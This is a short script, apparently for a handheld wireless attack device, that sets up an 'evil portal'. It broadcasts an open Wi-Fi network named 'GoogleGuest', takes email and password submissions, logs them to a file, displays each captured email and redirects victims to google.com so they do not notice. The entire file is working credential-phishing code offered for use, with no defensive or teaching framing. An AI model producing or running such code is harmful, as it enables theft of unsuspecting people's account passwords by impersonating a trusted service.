// Google Evil Portal - Credential Capture Script
// Linux-compatible version with error handling

try {
    // Initialize paths using current directory
    const base_path = "./DarkLugia";
    const assets_path = base_path + "/assets";
    const logs_path = base_path + "/logs";
    
    // Ensure directories exist
    system.create_directory(logs_path);
    
    // Display startup screen
    display.clear();
    
    // Try to load splash image if available
    try {
        display.draw_image(assets_path + "/splash.png", 0, 0);
    } catch (e) {
        console.log("Warning: splash.png not found");
    }
    
display.print("GOOGLE EVIL PORTAL");
display.print("Initializing captive portal...");
    
    // Start WiFi access point
    wifi.start_ap({
        ssid: "GoogleGuest",
        password: "",
        channel: 11,
        hidden: false,
        max_connections: 10
    });
    
    // Start HTTP server for portal
    http.start_server({
        port: 80,
        ssl: false
    });
    
    display.print("Portal Active on GoogleGuest");
display.print("Waiting for authentication...");
    
    var credentials_captured = 0;
    var max_captures = 10;
    
    // Listen for form submissions
    while(true) {
        var request = http.get_request();
        
        if(request && request.method === "POST") {
            // Extract credentials from POST data
            var email = request.params.email || request.body.email || "unknown";
            var password = request.body.password || "unknown";
            var timestamp = system.get_time();
            
            // Log the captured credentials
            var log_entry = timestamp + " | EMAIL: " + email + " | PASS: " + password + "\n";
            storage.append(logs_path + "/google_credentials.log", log_entry);
            
            // Play success sound if available
            try {
                audio.play(assets_path + "/roar.wav");
            } catch (e) {
                console.log("Warning: roar.wav not found");
            }
            
            display.print("CAPTURED: " + email);
            credentials_captured++;
            
            // Send redirect response
            http.send_response(302, {"Location": "https://google.com"}, "");
            
            if(credentials_captured >= max_captures) {
                break;
            }
        }
        
        // Small delay to prevent CPU spinning
        system.delay(100);
    }
    
    display.print("Captures Complete: " + credentials_captured);
    http.stop_server();
    wifi.stop_ap();
    
} catch (error) {
    display.clear();
    display.print("ERROR: Google Portal Failed");
    display.print(error.toString());
    console.error("Google portal error: " + error);
}